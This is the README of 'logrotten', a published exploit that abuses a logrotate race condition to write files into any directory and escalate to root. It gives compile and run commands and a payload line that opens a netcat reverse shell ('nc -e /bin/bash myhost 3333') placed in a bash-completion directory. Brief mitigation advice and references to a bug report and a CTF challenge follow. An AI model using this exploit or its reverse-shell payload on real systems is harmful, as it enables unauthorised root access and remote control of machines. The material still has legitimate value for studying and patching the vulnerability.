# logrotten - a logrotate exploit

## Brief description
  - logrotate has a race condition vulnerability when it's exectued with
    "create"-option.
  - If logrotate is executed as root, with the "create"-option and the user
    is in control of the logfile path, it is possible to abuse a race-condition 
    to write files in ANY directories.
  - An attacker could elevate his privileges by writing reverse-shells into 
    directories like "/etc/bash_completition.d/".
  - This vulnerability was reported by Marc Haber at the debian bug report
    ( https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=400198 )
  - and an issue was opened at the logrotate github-repository by cgzones
    ( https://github.com/cgzones )
  - This vulnerability was also a challenge at the 35c3 CTF 
    ( https://ctftime.org/event/718 )
  - A detailed description and a PoC of this challenge was written by the 
  - nsogroup ( https://blog.nsogroup.com/logrotate-zajebiste-500-points/ )

## Tested version
  - Debian GNU/Linux 9.5 (stretch)
  - logrotate 3.15.0

## Compile
  - gcc -o logrotten logrotten.c

## Prepare payload
```
echo "if [ `id -u` -eq 0 ]; /bin/nc -e /bin/bash myhost 3333 &; fi" > payloadfile
```

## Run exploit
```
./logrotten /tmp/log/pwnme.log payloadfile
```

## Mitigation
  - make sure that logpath is owned by root
  - or use option "nocreate"

## Author
  - Wolfgang Hotwagner

## Contact
  - https://tech.feedyourhead.at


